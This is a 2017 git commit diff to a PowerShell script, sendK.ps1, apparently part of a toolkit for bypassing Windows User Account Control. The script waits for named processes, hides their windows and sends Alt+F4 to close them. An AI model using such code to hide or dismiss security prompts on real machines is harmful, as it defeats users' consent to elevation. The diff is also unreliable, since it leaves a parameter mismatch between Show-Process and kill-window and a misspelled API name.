e478b0392e2246646ea44e478bf6086bdd7c04a2
Az <z0rk@protonmail.com>
2017-12-01 15:13:16 +0100

    Update sendK.ps1

--- Bypass-UAC/sendK.ps1
+++ Bypass-UAC/sendK.ps1
@@ -1,6 +1,20 @@
 #requires -Version 2
+function h($name){
+	$MainWindowHandle = ''
+	Do {
+		If (!(Get-Process -Name $name -ErrorAction SilentlyContinue)) {
+			Start-Sleep -Seconds 1
+		}Else {
+			$Process = ps -Name $name             
+			$MainWindowHandle = (Get-Process –Name $name).MainWindowHandle
+			$Status = 'Done'
+		}
+	}Until ($Status)
+	$p = ps -Name $name
+	return $p 
+}
 
-function Show-Process($Process, [Switch]$Maximize)
+function Show-Process($name, [Switch]$Maximize)
 {
 	  $sig = '
 	    [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
@@ -9,6 +23,7 @@ function Show-Process($Process, [Switch]$Maximize)
 	  
 	  if ($Maximize) { $Mode = 3 } else { $Mode = 4 }
 	  $type = Add-Type -MemberDefinition $sig -Name WindowAPI -PassThru
+	  $process = h($name)
 	  $hwnd = $process.MainWindowHandle
 	  $null = $type::ShowWindowAsync($hwnd, $Mode)
 	  $null = $type::SetForegroundWindow($hwnd) 
@@ -19,34 +34,19 @@ function hide-process($name){
 	    [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
 	    [DllImport("user32.dll")] public static extern int SetBackgroundgroundWindow(IntPtr hwnd);
 	  '
-    Do {
-        If (!(Get-Process -Name $name -ErrorAction SilentlyContinue)) {
-               Start-Sleep -Seconds 1
-        }Else {
-            $Process = ps -Name $name             
-            $MainWindowHandle = (Get-Process –Name $name).MainWindowHandle
-
-            $Status = 'Done'
-        }
-    }Until ($Status)  
-
+	$process = h($name)
+	$MainWindowHandle = (Get-Process –Name $name).MainWindowHandle
 	$type = Add-Type -MemberDefinition $sig -Name WindowAPI -PassThru
 	$hwnd = $process.MainWindowHandle
 	$Mode = '0'
 	$null = $type::ShowWindowAsync($hwnd, $Mode)
 }
 
-function kill-window($name){	
 
-	Do {
-	    If (!(Get-Process -Name $name -ErrorAction SilentlyContinue)) {
-	           Start-Sleep -Seconds 1
-	    }Else {
-	    	$Process = ps -Name $name	          
-			Show-Process -Process $Process
-			Add-Type -AssemblyName System.Windows.Forms
-			[System.Windows.Forms.SendKeys]::SendWait('%{F4}');
-			$Status = 'Done'
-	    }
-	}Until ($Status)
+function kill-window($name){	
+	$Process = h($name)	          
+	Show-Process -Process $Process
+	Add-Type -AssemblyName System.Windows.Forms
+	[System.Windows.Forms.SendKeys]::SendWait('%{F4}');
+	$Status = 'Done'
 }
